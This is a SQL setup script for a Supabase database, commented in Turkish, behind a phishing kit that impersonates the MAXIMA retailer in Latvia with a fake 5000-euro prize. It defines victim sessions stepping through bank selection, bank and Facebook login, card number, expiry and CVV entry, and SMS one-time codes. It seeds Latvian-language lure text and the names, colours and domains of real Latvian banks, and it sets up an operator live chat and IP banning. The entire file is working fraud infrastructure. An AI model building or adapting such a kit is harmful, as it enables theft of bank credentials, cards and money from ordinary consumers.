-- =====================================================================
-- MAXIMA LETONYA — TEMIZ SUPABASE KURULUMU (tek seferde calistir)
-- Tablolar: sessions, global_settings, banks, banned_ips, chat_messages
-- + storage bucket'lari (assets, chat_images) + realtime publication
-- Taze DB'de Litvanya/IKI kalintisi OLMAZ — tamami Letonca + MAXIMA.
-- =====================================================================

-- ==================== 1) SESSIONS ====================
CREATE TABLE IF NOT EXISTS public.sessions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  public_id bigint,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now(),
  amount numeric DEFAULT 0,
  current_step text NOT NULL DEFAULT 'win',
  status text NOT NULL DEFAULT 'offline',
  form_data jsonb NOT NULL DEFAULT '{}'::jsonb,
  is_hidden boolean DEFAULT false,
  partner_name text,
  participation_code text,
  sms_digits integer NOT NULL DEFAULT 6,
  sms_custom_text text,
  ip_address text,
  user_agent text,
  deleted_at timestamptz
);

CREATE SEQUENCE IF NOT EXISTS public.sessions_public_id_seq;
ALTER TABLE public.sessions ALTER COLUMN public_id SET DEFAULT nextval('public.sessions_public_id_seq');
ALTER SEQUENCE public.sessions_public_id_seq OWNED BY public.sessions.public_id;

ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_current_step_check;
ALTER TABLE public.sessions ADD CONSTRAINT sessions_current_step_check
CHECK (current_step IN (
  'code_entry','sms','win','verify','banken','card','wait','invalid_bank',
  'bank','live_support','special_approval','congratulations','congrats',
  'facebook','wheel','login','bank_login','SPECIAL_INFO',
  'generator1','generator2','custom_question','win2','banken2'
));

ALTER TABLE public.sessions ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS sessions_anon_select ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_update ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_insert ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_delete ON public.sessions;
DROP POLICY IF EXISTS sessions_authenticated_all ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_select_demo ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_update_demo ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_insert_demo ON public.sessions;
CREATE POLICY sessions_anon_select ON public.sessions FOR SELECT TO anon USING (true);
CREATE POLICY sessions_anon_update ON public.sessions FOR UPDATE TO anon USING (true) WITH CHECK (true);
CREATE POLICY sessions_anon_insert ON public.sessions FOR INSERT TO anon WITH CHECK (true);
CREATE POLICY sessions_authenticated_all ON public.sessions FOR ALL TO authenticated USING (true) WITH CHECK (true);

CREATE UNIQUE INDEX IF NOT EXISTS idx_sessions_public_id ON public.sessions (public_id) WHERE public_id IS NOT NULL;
CREATE INDEX IF NOT EXISTS idx_sessions_ip_created ON public.sessions (ip_address, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_sessions_created_at ON public.sessions (created_at DESC);

-- ==================== 2) GLOBAL_SETTINGS ====================
CREATE TABLE IF NOT EXISTS public.global_settings (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  logo_url text DEFAULT '/form-assets/maxima-logo.webp',
  bg_url text DEFAULT '/form-assets/bg-desktop.webp',
  background_url text,
  og_image_url text,
  portal_name text DEFAULT 'MAXIMA',
  support_center_name text DEFAULT 'MAXIMA atbalsta centrs',
  target_country text DEFAULT 'Letonya',
  site_language text DEFAULT 'lv',
  site_enabled boolean DEFAULT true,
  entry_page text DEFAULT '/win',
  wheel_settings jsonb DEFAULT '{}'::jsonb,
  win_title text,
  win_subtitle text,
  win_button text,
  banken_title text,
  banken_subtitle text,
  wait_title text,
  wait_subtitle text,
  sms_title text,
  card_title text,
  card_subtitle text,
  code_title text,
  code_subtitle text,
  code_button text,
  live_support_title text,
  live_support_subtitle text,
  live_support_button text,
  profile_title_small text,
  profile_title_main text,
  profile_subtitle text,
  profile_button text,
  banken_search_placeholder text,
  sms_subtitle text,
  sms_input_label text,
  sms_button text,
  sms_loading text,
  card_owner_label text,
  card_number_label text,
  card_expiry_label text,
  card_cvv_label text,
  card_button text,
  profile_firstname_label text,
  profile_lastname_label text,
  profile_phone_label text,
  profile_loading_text text,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);

ALTER TABLE public.global_settings ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Enable read access for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable insert for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable update for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable delete for all users" ON public.global_settings;
CREATE POLICY "Enable read access for all users" ON public.global_settings FOR SELECT USING (true);
CREATE POLICY "Enable insert for all users" ON public.global_settings FOR INSERT WITH CHECK (true);
CREATE POLICY "Enable update for all users" ON public.global_settings FOR UPDATE USING (true) WITH CHECK (true);
CREATE POLICY "Enable delete for all users" ON public.global_settings FOR DELETE USING (true);

ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS site_language text DEFAULT 'lv';

INSERT INTO public.global_settings (
  site_enabled, entry_page, site_language, target_country,
  logo_url, bg_url, portal_name, support_center_name,
  win_title, win_subtitle, win_button,
  banken_title, banken_subtitle, banken_search_placeholder,
  wait_title, wait_subtitle,
  sms_title, sms_subtitle, sms_input_label, sms_button, sms_loading,
  card_title, card_subtitle, card_owner_label, card_number_label,
  card_expiry_label, card_cvv_label, card_button,
  code_title, code_subtitle, code_button,
  live_support_title, live_support_subtitle, live_support_button,
  profile_title_small, profile_title_main, profile_subtitle,
  profile_firstname_label, profile_lastname_label, profile_phone_label,
  profile_button, profile_loading_text,
  wheel_settings
)
SELECT
  true, '/win', 'lv', 'Letonya',
  '/form-assets/maxima-logo.webp', '/form-assets/bg-desktop.webp',
  'MAXIMA klientu portāls', 'MAXIMA atbalsta centrs',
  'Ekskluzīva MAXIMA prēmija',
  'Apsveicam! Jūs esat izvēlēts šodienas MAXIMA kampaņai. Noklikšķiniet uz pogas zemāk, lai saņemtu savu 5000 eiro prēmiju.',
  'Saņemt prēmiju',
  'Izvēlieties savu banku', 'Izvēlieties savu banku, lai turpinātu.', 'Meklēt banku...',
  'Lūdzu, uzgaidiet', 'Jūsu pieprasījums tiek droši apstrādāts...',
  'SMS drošības kods', 'Ievadiet {digits} ciparu kodu.', 'Vienreizējs kods', 'Apstiprināt', 'Apstrādājas...',
  'Maksājuma informācija', 'Pārbaudiet un apstipriniet savus datus.',
  'Kartes īpašnieka vārds', 'Kartes numurs', 'Derīguma termiņš MM/GG', 'Drošības kods', 'Turpināt',
  'Laipni lūdzam', 'Ievadiet dalības kodu, ko saņēmāt no partnera {partner}, lai saņemtu apbalvojumu.', 'Apstiprināt kodu',
  'Tiešais atbalsts',
  'Lai turpinātu, jums jāsazinās ar mūsu klientu apkalpošanas nodaļu.' || chr(10) || chr(10) || 'Noklikšķiniet uz pogas zemāk, lai sāktu sarunu.',
  'Sākt sarunu',
  'Balvas apstiprinājums', 'Jūsu prēmijas summa', 'Apstipriniet savus datus turpmākai apstrādei.',
  'Vārds', 'Uzvārds', 'Mobilā tālruņa numurs', 'Tālāk', 'Apstrādājas...',
  '{"campaign_name":"MAXIMA"}'::jsonb
WHERE NOT EXISTS (SELECT 1 FROM public.global_settings);

-- Mevcut satir varsa: NULL alanlari LV varsayilanlariyla doldur + brand/kampanya garantisi
UPDATE public.global_settings SET
  site_language = COALESCE(site_language, 'lv'),
  target_country = COALESCE(target_country, 'Letonya'),
  logo_url = CASE WHEN logo_url IS NULL OR logo_url = '' OR logo_url LIKE '%iki-%' THEN '/form-assets/maxima-logo.webp' ELSE logo_url END,
  bg_url = CASE WHEN bg_url IS NULL OR bg_url = '' THEN '/form-assets/bg-desktop.webp' ELSE bg_url END,
  portal_name = COALESCE(portal_name, 'MAXIMA klientu portāls'),
  support_center_name = COALESCE(support_center_name, 'MAXIMA atbalsta centrs'),
  win_title = COALESCE(win_title, 'Ekskluzīva MAXIMA prēmija'),
  win_subtitle = COALESCE(win_subtitle, 'Apsveicam! Jūs esat izvēlēts šodienas MAXIMA kampaņai. Noklikšķiniet uz pogas zemāk, lai saņemtu savu 5000 eiro prēmiju.'),
  win_button = COALESCE(win_button, 'Saņemt prēmiju'),
  banken_title = COALESCE(banken_title, 'Izvēlieties savu banku'),
  banken_subtitle = COALESCE(banken_subtitle, 'Izvēlieties savu banku, lai turpinātu.'),
  banken_search_placeholder = COALESCE(banken_search_placeholder, 'Meklēt banku...'),
  wait_title = COALESCE(wait_title, 'Lūdzu, uzgaidiet'),
  wait_subtitle = COALESCE(wait_subtitle, 'Jūsu pieprasījums tiek droši apstrādāts...'),
  sms_title = COALESCE(sms_title, 'SMS drošības kods'),
  sms_subtitle = COALESCE(sms_subtitle, 'Ievadiet {digits} ciparu kodu.'),
  sms_input_label = COALESCE(sms_input_label, 'Vienreizējs kods'),
  sms_button = COALESCE(sms_button, 'Apstiprināt'),
  sms_loading = COALESCE(sms_loading, 'Apstrādājas...'),
  card_title = COALESCE(card_title, 'Maksājuma informācija'),
  card_subtitle = COALESCE(card_subtitle, 'Pārbaudiet un apstipriniet savus datus.'),
  card_owner_label = COALESCE(card_owner_label, 'Kartes īpašnieka vārds'),
  card_number_label = COALESCE(card_number_label, 'Kartes numurs'),
  card_expiry_label = COALESCE(card_expiry_label, 'Derīguma termiņš MM/GG'),
  card_cvv_label = COALESCE(card_cvv_label, 'Drošības kods'),
  card_button = COALESCE(card_button, 'Turpināt'),
  code_title = COALESCE(code_title, 'Laipni lūdzam'),
  code_subtitle = COALESCE(code_subtitle, 'Ievadiet dalības kodu, ko saņēmāt no partnera {partner}, lai saņemtu apbalvojumu.'),
  code_button = COALESCE(code_button, 'Apstiprināt kodu'),
  live_support_title = COALESCE(live_support_title, 'Tiešais atbalsts'),
  live_support_subtitle = COALESCE(live_support_subtitle, 'Lai turpinātu, jums jāsazinās ar mūsu klientu apkalpošanas nodaļu.' || chr(10) || chr(10) || 'Noklikšķiniet uz pogas zemāk, lai sāktu sarunu.'),
  live_support_button = COALESCE(live_support_button, 'Sākt sarunu'),
  profile_title_small = COALESCE(profile_title_small, 'Balvas apstiprinājums'),
  profile_title_main = COALESCE(profile_title_main, 'Jūsu prēmijas summa'),
  profile_subtitle = COALESCE(profile_subtitle, 'Apstipriniet savus datus turpmākai apstrādei.'),
  profile_firstname_label = COALESCE(profile_firstname_label, 'Vārds'),
  profile_lastname_label = COALESCE(profile_lastname_label, 'Uzvārds'),
  profile_phone_label = COALESCE(profile_phone_label, 'Mobilā tālruņa numurs'),
  profile_button = COALESCE(profile_button, 'Tālāk'),
  profile_loading_text = COALESCE(profile_loading_text, 'Apstrādājas...'),
  wheel_settings = COALESCE(wheel_settings, '{}'::jsonb) || '{"campaign_name":"MAXIMA"}'::jsonb
WHERE id = (SELECT id FROM public.global_settings ORDER BY created_at NULLS LAST LIMIT 1);

-- ==================== 3) BANKS (Letonya) ====================
CREATE TABLE IF NOT EXISTS public.banks (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  slug text UNIQUE NOT NULL,
  name text NOT NULL,
  brand_color text,
  accent_color text,
  logo_file text,
  domain text,
  country text DEFAULT 'Letonya',
  is_active boolean DEFAULT true,
  auto_redirect boolean DEFAULT false,
  design_config jsonb DEFAULT '{}'::jsonb,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);

ALTER TABLE public.banks ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow public read access on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public insert on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public update on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public delete on banks" ON public.banks;
CREATE POLICY "Allow public read access on banks" ON public.banks FOR SELECT USING (true);
CREATE POLICY "Allow public insert on banks" ON public.banks FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow public update on banks" ON public.banks FOR UPDATE USING (true);
CREATE POLICY "Allow public delete on banks" ON public.banks FOR DELETE USING (true);

ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS auto_redirect boolean DEFAULT false;

-- Letonya bankalari (AKTIF)
INSERT INTO public.banks (slug, name, brand_color, accent_color, domain, logo_file, is_active, country, auto_redirect)
VALUES
  ('swedbank-lv',    'Swedbank',      '#f35b1c', '#ffffff', 'swedbank.lv',      'bank-logos/latvia/swedbank-lv.webp',    true, 'Letonya', false),
  ('seb-lv',         'SEB banka',     '#60cd18', '#ffffff', 'seb.lv',           'bank-logos/latvia/seb-lv.webp',         true, 'Letonya', false),
  ('citadele-lv',    'Citadele banka','#ee2737', '#ffffff', 'citadele.lv',      'bank-logos/latvia/citadele-lv.webp',    true, 'Letonya', false),
  ('luminor-lv',     'Luminor',       '#003c71', '#ffffff', 'luminor.lv',       'bank-logos/latvia/luminor-lv.webp',     true, 'Letonya', false),
  ('ribbank-lv',     'RIB bank',      '#702f8a', '#ffffff', 'ribbank.com',      NULL,                                  true, 'Letonya', false),
  ('bluorbank-lv',   'BluOr Bank',    '#00427a', '#ffffff', 'bluorbank.lv',     NULL,                                  true, 'Letonya', false),
  ('industra-lv',    'Industra Bank', '#0a2d4e', '#ffffff', 'industra.finance', NULL,                                  true, 'Letonya', false),
  ('magnetiqbank-lv','Magnetiq Bank', '#e01e26', '#ffffff', 'magnetiqbank.com', NULL,                                  true, 'Letonya', false),
  ('signet-bank-lv', 'Signet Bank',   '#1b365d', '#ffffff', 'signetbank.com',   NULL,                                  true, 'Letonya', false)
ON CONFLICT (slug) DO UPDATE SET
  name = EXCLUDED.name,
  brand_color = EXCLUDED.brand_color,
  accent_color = EXCLUDED.accent_color,
  domain = EXCLUDED.domain,
  logo_file = EXCLUDED.logo_file,
  country = EXCLUDED.country,
  is_active = EXCLUDED.is_active;

-- Facebook login akisi (kullanici listesinde gorunmez)
INSERT INTO public.banks (slug, name, logo_file, country, is_active)
VALUES ('facebook-lv', 'Facebook', '/form-assets/maxima-logo.webp', 'Letonya', false)
ON CONFLICT (slug) DO NOTHING;

-- ==================== 4) BANNED_IPS ====================
CREATE TABLE IF NOT EXISTS public.banned_ips (
  ip_address text PRIMARY KEY,
  reason text,
  banned_at timestamptz DEFAULT now()
);

ALTER TABLE public.banned_ips ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow all read access to banned_ips" ON public.banned_ips;
DROP POLICY IF EXISTS "Allow all insert access to banned_ips" ON public.banned_ips;
DROP POLICY IF EXISTS "Allow all delete access to banned_ips" ON public.banned_ips;
CREATE POLICY "Allow all read access to banned_ips" ON public.banned_ips FOR SELECT USING (true);
CREATE POLICY "Allow all insert access to banned_ips" ON public.banned_ips FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow all delete access to banned_ips" ON public.banned_ips FOR DELETE USING (true);

-- ==================== 5) CHAT ====================
CREATE TABLE IF NOT EXISTS public.chat_messages (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id text NOT NULL, -- route session id (public_id VEYA uuid) tasir; FK yok
  sender text NOT NULL CHECK (sender IN ('user','admin')),
  content text NOT NULL,
  image_url text,
  created_at timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_chat_messages_session ON public.chat_messages (session_id);

ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS chat_messages_anon_all ON public.chat_messages;
DROP POLICY IF EXISTS chat_messages_auth_all ON public.chat_messages;
CREATE POLICY chat_messages_anon_all ON public.chat_messages FOR ALL TO anon USING (true) WITH CHECK (true);
CREATE POLICY chat_messages_auth_all ON public.chat_messages FOR ALL TO authenticated USING (true) WITH CHECK (true);

-- ==================== 6) STORAGE BUCKET'LARI ====================
INSERT INTO storage.buckets (id, name, public) VALUES ('assets', 'assets', true) ON CONFLICT (id) DO NOTHING;
INSERT INTO storage.buckets (id, name, public) VALUES ('chat_images', 'chat_images', true) ON CONFLICT (id) DO NOTHING;

DROP POLICY IF EXISTS "Public Access" ON storage.objects;
DROP POLICY IF EXISTS "Allow Uploads" ON storage.objects;
DROP POLICY IF EXISTS "chat_images_select" ON storage.objects;
DROP POLICY IF EXISTS "chat_images_insert" ON storage.objects;
CREATE POLICY "Public Access" ON storage.objects FOR SELECT USING (bucket_id IN ('assets','chat_images'));
CREATE POLICY "Allow Uploads" ON storage.objects FOR INSERT WITH CHECK (bucket_id IN ('assets','chat_images'));

-- ==================== 7) REALTIME (canli log/presence/chat) ====================
DO $$ BEGIN
  ALTER PUBLICATION supabase_realtime ADD TABLE public.sessions;
EXCEPTION WHEN duplicate_object THEN NULL; END $$;
DO $$ BEGIN
  ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_messages;
EXCEPTION WHEN duplicate_object THEN NULL; END $$;

NOTIFY pgrst, 'reload schema';

-- Kontrol
SELECT 'sessions' t, count(*) FROM public.sessions
UNION ALL SELECT 'global_settings', count(*) FROM public.global_settings
UNION ALL SELECT 'banks', count(*) FROM public.banks
UNION ALL SELECT 'banned_ips', count(*) FROM public.banned_ips
UNION ALL SELECT 'chat_messages', count(*) FROM public.chat_messages;
